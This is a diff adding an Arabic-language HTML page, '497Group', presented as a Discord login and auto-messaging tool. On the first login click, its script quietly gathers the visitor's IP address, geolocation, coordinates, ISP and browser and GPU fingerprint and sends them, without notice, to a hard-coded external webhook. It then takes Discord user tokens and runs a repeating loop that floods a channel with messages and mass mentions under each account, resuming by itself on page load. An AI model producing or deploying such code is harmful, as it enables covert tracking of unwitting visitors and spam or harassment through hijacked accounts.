@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>497 - خالد | </title>
+  <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #000000 0%, #1a0000 25%, #330000 50%, #660000 75%, #990000 100%);
+      background-size: 400% 400%;
+      animation: bloodShift 20s ease infinite;
+      color: #fff;
+      text-align: center;
+      direction: rtl;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        radial-gradient(circle at 20% 80%, rgba(255, 0, 0, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(139, 0, 0, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 40% 40%, rgba(178, 34, 34, 0.1) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    @keyframes bloodShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 40px auto;
+      background: linear-gradient(145deg, rgba(0, 0, 0, 0.8), rgba(139, 0, 0, 0.2));
+      backdrop-filter: blur(20px);
+      padding: 40px;
+      border-radius: 25px;
+      box-shadow: 
+        0 25px 50px rgba(255, 0, 0, 0.4),
+        inset 0 1px 0 rgba(255, 0, 0, 0.2),
+        0 0 60px rgba(255, 0, 0, 0.3);
+      border: 2px solid rgba(255, 0, 0, 0.5);
+      position: relative;
+      overflow: hidden;
+      transform: perspective(1000px) rotateX(5deg);
+      transition: all 0.5s ease;
+    }
+
+    .container:hover {
+      transform: perspective(1000px) rotateX(0deg) scale(1.02);
+      box-shadow: 
+        0 35px 70px rgba(255, 0, 0, 0.6),
+        inset 0 1px 0 rgba(255, 0, 0, 0.3),
+        0 0 80px rgba(255, 0, 0, 0.5);
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 0, 0, 0.2), transparent);
+      animation: redShimmer 4s infinite;
+    }
+
+    @keyframes redShimmer {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    h1, h2 {
+      font-family: 'Amiri', serif;
+      background: linear-gradient(45deg, #ff0000, #ff4444, #cc0000, #ff0000);
+      background-size: 400% 400%;
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: redShine 3s ease-in-out infinite;
+      text-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
+      margin-bottom: 30px;
+      font-weight: 700;
+    }
+
+    h1 {
+      font-size: 3.5rem;
+      letter-spacing: 3px;
+    }
+
+    h2 {
+      font-size: 2.2rem;
+      letter-spacing: 2px;
+    }
+
+    @keyframes redShine {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+
+    input, textarea, button, select {
+      width: 90%;
+      padding: 18px 25px;
+      margin: 15px 0;
+      font-size: 18px;
+      border: none;
+      border-radius: 15px;
+      outline: none;
+      font-family: 'Cairo', sans-serif;
+      transition: all 0.4s ease;
+      position: relative;
+    }
+
+    textarea, input, select {
+      background: rgba(0, 0, 0, 0.7);
+      color: #fff;
+      border: 2px solid rgba(255, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+    }
+
+    textarea:focus, input:focus, select:focus {
+      border-color: #ff0000;
+      box-shadow: 
+        0 0 25px rgba(255, 0, 0, 0.6),
+        inset 0 0 20px rgba(255, 0, 0, 0.2);
+      transform: scale(1.02);
+    }
+
+    textarea::placeholder, input::placeholder {
+      color: rgba(255, 255, 255, 0.6);
+    }
+
+    button {
+      background: linear-gradient(135deg, #ff0000, #cc0000, #990000);
+      color: #fff;
+      font-weight: 700;
+      cursor: pointer;
+      border: 2px solid transparent;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: 0.5s;
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    button:hover {
+      transform: translateY(-3px) scale(1.05);
+      box-shadow: 
+        0 15px 35px rgba(255, 0, 0, 0.6),
+        0 0 30px rgba(255, 0, 0, 0.8);
+    }
+
+    button:active {
+      transform: translateY(-1px) scale(1.02);
+    }
+
+    #stopBtn {
+      background: linear-gradient(135deg, #8b0000, #660000, #330000);
+    }
+
+    pre {
+      background: rgba(0, 0, 0, 0.9);
+      text-align: left;
+      padding: 25px;
+      border-radius: 15px;
+      max-height: 350px;
+      overflow-y: auto;
+      color: #00ff00;
+      font-size: 14px;
+      border: 2px solid rgba(255, 0, 0, 0.4);
+      backdrop-filter: blur(10px);
+      box-shadow: inset 0 0 20px rgba(255, 0, 0, 0.2);
+      font-family: 'Courier New', monospace;
+    }
+
+    pre::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    pre::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 4px;
+    }
+
+    pre::-webkit-scrollbar-thumb {
+      background: linear-gradient(135deg, #ff0000, #cc0000);
+      border-radius: 4px;
+    }
+
+    footer {
+      margin-top: 30px;
+      color: rgba(255, 0, 0, 0.9);
+      font-size: 16px;
+      font-weight: 600;
+      text-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
+    }
+
+    label {
+      display: block;
+      margin: 20px 0 10px;
+      font-weight: 600;
+      color: #ff0000;
+      font-size: 18px;
+    }
+
+    .luxury-title {
+      position: relative;
+      display: inline-block;
+    }
+
+    .luxury-title::after {
+      content: '';
+      position: absolute;
+      bottom: -10px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80%;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, #ff0000, transparent);
+      border-radius: 2px;
+    }
+
+    .floating-elements {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .floating-elements::before,
+    .floating-elements::after {
+      content: '';
+      position: absolute;
+      width: 6px;
+      height: 6px;
+      background: #ff0000;
+      border-radius: 50%;
+      animation: bloodFloat 8s ease-in-out infinite;
+      box-shadow: 0 0 15px #ff0000;
+    }
+
+    .floating-elements::before {
+      top: 20%;
+      left: 10%;
+      animation-delay: 0s;
+    }
+
+    .floating-elements::after {
+      top: 60%;
+      right: 15%;
+      animation-delay: 4s;
+    }
+
+    @keyframes bloodFloat {
+      0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
+      50% { transform: translateY(-30px) rotate(180deg); opacity: 0.7; }
+    }
+
+    .status-indicator {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #ff0000;
+      margin-left: 10px;
+      animation: redPulse 2s infinite;
+    }
+
+    @keyframes redPulse {
+      0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.8); }
+      70% { box-shadow: 0 0 0 15px rgba(255, 0, 0, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
+    }
+
+    .success-glow {
+      animation: redSuccessGlow 0.8s ease-out;
+    }
+
+    @keyframes redSuccessGlow {
+      0% { box-shadow: 0 0 10px #ff0000; }
+      50% { box-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000; }
+      100% { box-shadow: 0 0 10px #ff0000; }
+    }
+
+    .background-status {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      padding: 10px 15px;
+      background: rgba(0, 0, 0, 0.8);
+      border: 2px solid #ff0000;
+      border-radius: 10px;
+      color: #ff0000;
+      font-weight: bold;
+      z-index: 1000;
+      display: none;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        margin: 20px;
+        padding: 25px;
+        transform: none;
+      }
+      
+      h1 { font-size: 2.5rem; }
+      h2 { font-size: 1.8rem; }
+      
+      input, textarea, button, select {
+        width: 95%;
+        padding: 15px 20px;
+        font-size: 16px;
+      }
+    }
+
+    .blood-effect {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -2;
+      background: 
+        radial-gradient(circle at 25% 25%, rgba(139, 0, 0, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 75% 75%, rgba(178, 34, 34, 0.1) 0%, transparent 50%);
+      animation: bloodPulse 10s ease-in-out infinite;
+    }
+
+    @keyframes bloodPulse {
+      0%, 100% { opacity: 0.3; }
+      50% { opacity: 0.7; }
+    }
+  </style>
+</head>
+<body>
+  <div class="blood-effect"></div>
+  <div class="floating-elements"></div>
+  <div class="background-status" id="backgroundStatus">يعمل في الخلفية 🔴</div>
+
+  <div class="container" id="visitorLogger">
+    <h2 class="luxury-title"> تسجيل دخول </h2>
+    <input type="text" id="visitorName" placeholder="مثال: khalid#0001">
+    <button id="saveVisitor"><i class="fas fa-crown"></i> دخول </button>
+  </div>
+
+  <div class="container hidden" id="login">
+    <h1 class="luxury-title">🔥  تسجيل التوكنات  🔥</h1>
+    <textarea id="tokenInput" placeholder="اكتب التوكنات، كل توكن بسطر منفصل" rows="6"></textarea>
+    <button id="loginBtn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
+  </div>
+
+  <div class="container hidden" id="main">
+    <h1 class="luxury-title"> 497Group   </h1>
+    <span class="status-indicator"></span>
+    
+    <!-- تبويب Auto فقط -->
+    <div id="auto">
+      <input type="text" id="channelId" placeholder="ID الروم / الخاص / القروب">
+      <input type="text" id="mention" placeholder="اكتب الآيديات (مفصولة بفاصلة)">
+      <input type="number" id="delay" placeholder="التأخير بالثواني" value="1" step="0.1">
+      
+      <label for="sendType">نوع الإرسال:</label>
+      <select id="sendType">
+        <option value="random">عشوائي</option>
+        <option value="sequential">منتظم</option>
+      </select>
+      
+      <button id="startBtn"><i class="fas fa-rocket"></i> ابدأ الإرسال</button>
+      <button id="stopBtn"><i class="fas fa-stop"></i> إيقاف الإرسال</button>
+    </div>
+    
+    <pre id="logBox"></pre>
+    
+    <footer> 497 </footer>
+  </div>
+
+  <script>
+    // رسائل افتراضية في حال عدم وجود ملف messages.js
+    const messages = [
+      "أهلاً بالجميع!",
+      "كيف الحال؟",
+      "يوم جميل اليوم",
+      "أتمنى للجميع يومًا سعيدًا",
+      "ما الأخبار؟",
+      "أنا هنا للمساعدة",
+      "هل تحتاج إلى مساعدة؟",
+      "دعونا نعمل معًا",
+      "أنا متحمس لهذا المشروع",
+      "هذا رائع!",
+      "شكرًا لك",
+      "أقدر مساعدتك",
+      "دعونا نبدأ",
+      "هل أنت مستعد؟",
+      "هيا بنا",
+      "لنعمل بجد",
+      "لا تتوقف أبدًا عن التعلم",
+      "التقدم يحدث خارج منطقة الراحة الخاصة بك",
+      "أنت قادر على تحقيق أي شيء",
+      "استمر في المحاولة",
+      "الفشل هو مجرد فرصة للبدء من جديد بذكاء أكبر",
+      "الإيمان بالنجاح هو نصف تحقيقه",
+      "لا يوجد بديل للعمل الجاد",
+      "كن التغيير الذي تريد رؤيته في العالم"
+    ];
+
+    const visitorLogger = document.getElementById("visitorLogger");
+    const visitorNameInput = document.getElementById("visitorName");
+    const saveVisitorBtn = document.getElementById("saveVisitor");
+    const loginSection = document.getElementById('login');
+    const mainSection = document.getElementById('main');
+    const backgroundStatus = document.getElementById('backgroundStatus');
+
+    const tokenInput = document.getElementById('tokenInput');
+    const channelInput = document.getElementById('channelId');
+    const mentionInput = document.getElementById('mention');
+    const delayInput = document.getElementById('delay');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const logBox = document.getElementById('logBox');
+    const sendType = document.getElementById('sendType');
+
+    let tokens = [];
+    let stop = false;
+    let backgroundTaskActive = false;
+    let taskInterval = null;
+
+    // تأثيرات صوتية للنجاح
+    function addSuccessEffect(element) {
+      element.classList.add('success-glow');
+      setTimeout(() => element.classList.remove('success-glow'), 800);
+    }
+
+    // إظهار حالة العمل في الخلفية
+    function updateBackgroundStatus(active) {
+      backgroundTaskActive = active;
+      if (active) {
+        backgroundStatus.style.display = 'block';
+        logBox.innerText += "🔴 الإرسال يعمل في الخلفية الآن\n";
+        logBox.scrollTop = logBox.scrollHeight;
+      } else {
+        backgroundStatus.style.display = 'none';
+        logBox.innerText += "🟢 توقف العمل في الخلفية\n";
+        logBox.scrollTop = logBox.scrollHeight;
+      }
+    }
+
+    async function getBrowserInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl');
+      const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+      
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages.join(', '),
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'غير معروف',
+        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'غير معروف',
+        webgl: gl ? 'مدعوم' : 'غير مدعوم',
+        localStorage: typeof(Storage) !== "undefined" ? 'مدعوم' : 'غير مدعوم',
+        sessionStorage: typeof(Storage) !== "undefined" ? 'مدعوم' : 'غير مدعوم'
+      };
+    }
+
+    async function getAdvancedIPData() {
+      try {
+        const [ipify, ipapi] = await Promise.all([
+          fetch("https://api.ipify.org?format=json").then(r => r.json()),
+          fetch("https://ipapi.co/json/").then(r => r.json())
+        ]);
+
+        return {
+          ip: ipify.ip || ipapi.ip,
+          country: ipapi.country_name || "غير معروف",
+          countryCode: ipapi.country_code || "غير معروف",
+          region: ipapi.region || "غير معروف", 
+          city: ipapi.city || "غير معروف",
+          postal: ipapi.postal || "غير معروف",
+          latitude: ipapi.latitude || "غير معروف",
+          longitude: ipapi.longitude || "غير معروف",
+          timezone: ipapi.timezone || "غير معروف",
+          currency: ipapi.currency || "غير معروف",
+          org: ipapi.org || "غير معروف",
+          asn: ipapi.asn || "غير معروف",
+          isp: ipapi.org || "غير معروف"
+        };
+      } catch {
+        return { 
+          ip: "غير معروف", 
+          country: "غير معروف", 
+          city: "غير معروف", 
+          org: "غير معروف",
+          timezone: "غير معروف",
+          currency: "غير معروف"
+        };
+      }
+    }
+
+    async function sendToWebhook(data) {
+      const webhookUrl = "https://l.webhook.party/hook/RbwjegFdDg1jVOCxRW6BQLa4mjjYGH9tyRnK%2FAic7V0G2b6N35aP1%2BQlFWgqCFYUvIym5fr9YMJJtOKED7B%2FEs%2BBXDqFNbk3MynY%2BklRjvfPQYWsyMKD0a3AUKzD3uJbJCFfF38OlW3P7RycCBOx4ka3Y5%2BmpNpEC0nK9K7pKjSOKhkpJlJH%2FbYjT9HwvhztgHudB%2Fnw%2F07Bn%2F%2BUqqIRYkJ%2FQKTD824YU945mn4B6S7SfkiEPuSSTlUAgRq0jIr%2FfWJlILoSpXkRMW21Cs7oG8xAEFDRu07mNE4iwRnqH1HdYeskM4cmjm%2BCZ1h1fZC%2BSaXkKgdPBGpLiqpAhq1YaG%2B36hP0qsDMTPYFCSf8aXc6nLMIRNPAdQOrVwlHfYkjD%2FYjN4ZiJDg%3D/%2FhoXeCCRWRGLvQ6I";
+      
+      const embed = {
+        title: "New login",
+        color: 16711680,
+        thumbnail: {
+          url: "https://cdn.discordapp.com/emojis/123456789.gif"
+        },
+        fields: [
+          { name: "👤 الاسم", value: `\`${data.name}\``, inline: true },
+          { name: "🌍 الدولة", value: `${data.country} (${data.countryCode})`, inline: true },
+          { name: "🏙️ المدينة والمنطقة", value: `${data.city} - ${data.region}`, inline: true },
+          { name: "🌐 عنوان IP", value: `\`${data.ip}\``, inline: true },
+          { name: "📮 الرمز البريدي", value: `\`${data.postal}\``, inline: true },
+          { name: "🕐 المنطقة الزمنية", value: `${data.timezone}`, inline: true },
+          { name: "📍 الإحداثيات", value: `${data.latitude}, ${data.longitude}`, inline: true },
+          { name: "💰 العملة", value: `${data.currency}`, inline: true },
+          { name: "🏢 مزود الخدمة", value: `${data.org}`, inline: true },
+          { name: "🔗 ASN", value: `\`${data.asn}\``, inline: true },
+          { name: "🖥️ نظام التشغيل", value: `${data.browser.platform}`, inline: true },
+          { name: "🌐 المتصفح", value: `${data.browser.userAgent.split(' ').pop()}`, inline: true },
+          { name: "📱 دقة الشاشة", value: `${data.browser.screen}`, inline: true },
+          { name: "🎨 عمق الألوان", value: `${data.browser.colorDepth} بت`, inline: true },
+          { name: "🌍 اللغة", value: `${data.browser.language}`, inline: true },
+          { name: "🔊 اللغات المدعومة", value: `${data.browser.languages}`, inline: false },
+          { name: "🎮 معالج الرسوميات", value: `${data.browser.gpu}`, inline: true },
+          { name: "🏭 الشركة المصنعة", value: `${data.browser.vendor}`, inline: true },
+          { name: "🔧 WebGL", value: `${data.browser.webgl}`, inline: true },
+          { name: "💾 التخزين المحلي", value: `${data.browser.localStorage}`, inline: true },
+          { name: "🍪 الكوكيز", value: `${data.browser.cookieEnabled ? 'مفعل' : 'معطل'}`, inline: true },
+          { name: "📶 حالة الاتصال", value: `${data.browser.onLine ? 'متصل' : 'غير متصل'}`, inline: true },
+          { name: "⏰ وقت الدخول", value: `${data.time}`, inline: false },
+          { name: "🔗 رابط الموقع", value: `${window.location.href}`, inline: false }
+        ],
+        footer: { 
+          text: "497",
+          icon_url: "https://cdn.discordapp.com/emojis/123456789.png"
+        },
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+      } catch (error) {
+        console.error("خطأ في الدخول:", error);
+      }
+    }
+
+    saveVisitorBtn.onclick = async () => {
+      const name = visitorNameInput.value.trim();
+      if (!name) {
+        alert("من فضلك اكتب يوزرك في ديسكورد");
+        return;
+      }
+
+      saveVisitorBtn.textContent = "جاري الدخول...";
+      saveVisitorBtn.disabled = true;
+
+      try {
+        const [ipInfo, browserInfo] = await Promise.all([
+          getAdvancedIPData(),
+          getBrowserInfo()
+        ]);
+        
+        const now = new Date().toLocaleString("ar-SA", {
+          timeZone: 'Asia/Riyadh',
+          year: 'numeric',
+          month: 'long',
+          day: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit'
+        });
+
+        const log = {
+          name,
+          ...ipInfo,
+          browser: browserInfo,
+          time: now
+        };
+
+        await sendToWebhook(log);
+        addSuccessEffect(saveVisitorBtn);
+
+        setTimeout(() => {
+          visitorLogger.classList.add("hidden");
+          loginSection.classList.remove("hidden");
+        }, 1000);
+
+      } catch (error) {
+        console.error("خطأ في الدخول:", error);
+        alert("حدث خطأ، يرجى المحاولة مرة أخرى");
+      } finally {
+        saveVisitorBtn.textContent = "دخول للنخبة الدموية";
+        saveVisitorBtn.disabled = false;
+      }
+    };
+
+    document.getElementById('loginBtn').onclick = () => {
+      tokens = tokenInput.value.trim().split('\n').map(t => t.trim()).filter(t => t);
+      if (tokens.length === 0) return alert('من فضلك اكتب التوكنات');
+      
+      addSuccessEffect(document.getElementById('loginBtn'));
+      loginSection.classList.add('hidden');
+      mainSection.classList.remove('hidden');
+    };
+
+    function getRandomMessage() {
+      const index = Math.floor(Math.random() * messages.length);
+      return messages[index];
+    }
+
+    function getSequentialMessage(index) {
+      return messages[index % messages.length];
+    }
+
+    async function sendMessage(token, channelId, content) {
+      const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
+      const data = { content };
+      const res = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Authorization": token,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+
+      const txt = await res.text();
+      if (res.ok) {
+        logBox.innerText += `🩸 ${token.slice(0, 15)}...: ${content}\n`;
+        logBox.scrollTop = logBox.scrollHeight;
+      } else {
+        logBox.innerText += `💀 ${token.slice(0, 15)}...: ${res.status} - ${txt}\n`;
+        logBox.scrollTop = logBox.scrollHeight;
+      }
+    }
+
+    startBtn.onclick = async () => {
+      const channelId = channelInput.value.trim();
+      const mentionsRaw = mentionInput.value.trim();
+      const mentions = mentionsRaw
+        ? mentionsRaw.split(',').map(id => `<@${id.trim()}>`).join(' ')
+        : "";
+      const delay = parseFloat(delayInput.value) * 1000;
+      const type = sendType.value;
+
+      if (!channelId) return alert("من فضلك اكتب ID الروم");
+
+      stop = false;
+      addSuccessEffect(startBtn);
+      updateBackgroundStatus(true);
+
+      // حفظ بيانات المهمة للعمل في الخلفية
+      const taskData = {
+        tokens,
+        channelId,
+        mentions,
+        delay,
+        type
+      };
+      
+      localStorage.setItem('backgroundTask', JSON.stringify(taskData));
+      
+      // بدء المهمة في الخلفية
+      startBackgroundTask(taskData);
+      
+      logBox.innerText += `🔥 بدأ الإرسال   ${tokens.length} .\n`;
+      logBox.scrollTop = logBox.scrollHeight;
+    };
+
+    function startBackgroundTask(taskData) {
+      // إيقاف أي مهمة سابقة
+      if (taskInterval) {
+        clearInterval(taskInterval);
+      }
+      
+      let messageIndex = 0;
+      
+      taskInterval = setInterval(async () => {
+        if (stop) {
+          clearInterval(taskInterval);
+          return;
+        }
+        
+        for (const token of taskData.tokens) {
+          try {
+            let msg;
+            if (taskData.type === "random") {
+              msg = taskData.mentions 
+                ? `${getRandomMessage()} ${taskData.mentions}` 
+                : getRandomMessage();
+            } else {
+              msg = taskData.mentions 
+                ? `${getSequentialMessage(messageIndex)} ${taskData.mentions}` 
+                : getSequentialMessage(messageIndex);
+            }
+            
+            await sendMessage(token, taskData.channelId, msg);
+          } catch (error) {
+            logBox.innerText += `❌ ${token.slice(0, 15)}...: خطأ في الإرسال - ${error.message}\n`;
+            logBox.scrollTop = logBox.scrollHeight;
+          }
+        }
+        
+        messageIndex++;
+      }, taskData.delay);
+    }
+
+    stopBtn.onclick = () => {
+      stop = true;
+      addSuccessEffect(stopBtn);
+      updateBackgroundStatus(false);
+      
+      // إزالة بيانات المهمة من التخزين
+      localStorage.removeItem('backgroundTask');
+      
+      // إيقاف المهمة
+      if (taskInterval) {
+        clearInterval(taskInterval);
+        taskInterval = null;
+      }
+      
+      logBox.innerText += `اقلب وجهك يلا\n`;
+      logBox.scrollTop = logBox.scrollHeight;
+    };
+
+    // التحقق من وجود مهمة نشطة عند تحميل الصفحة
+    window.addEventListener('load', () => {
+      const activeTask = localStorage.getItem('backgroundTask');
+      if (activeTask) {
+        const taskData = JSON.parse(activeTask);
+        tokens = taskData.tokens;
+        stop = false;
+        updateBackgroundStatus(true);
+        startBackgroundTask(taskData);
+        logBox.innerText += "🔴 تم استئناف المهمة النشطة في الخلفية\n";
+        logBox.scrollTop = logBox.scrollHeight;
+        
+        // إظهار القسم الرئيسي مباشرة
+        visitorLogger.classList.add("hidden");
+        loginSection.classList.add("hidden");
+        mainSection.classList.remove("hidden");
+      }
+    });
+
+    // إعادة تشغيل المهمة عند العودة إلى الصفحة
+    document.addEventListener('visibilitychange', function() {
+      if (!document.hidden && backgroundTaskActive) {
+        const activeTask = localStorage.getItem('backgroundTask');
+        if (activeTask) {
+          const taskData = JSON.parse(activeTask);
+          startBackgroundTask(taskData);
+          logBox.innerText += "🔄 تم استئناف الإرسال بعد العودة إلى الصفحة\n";
+          logBox.scrollTop = logBox.scrollHeight;
+        }
+      }
+    });
+  </script>
+</body>
+</html>
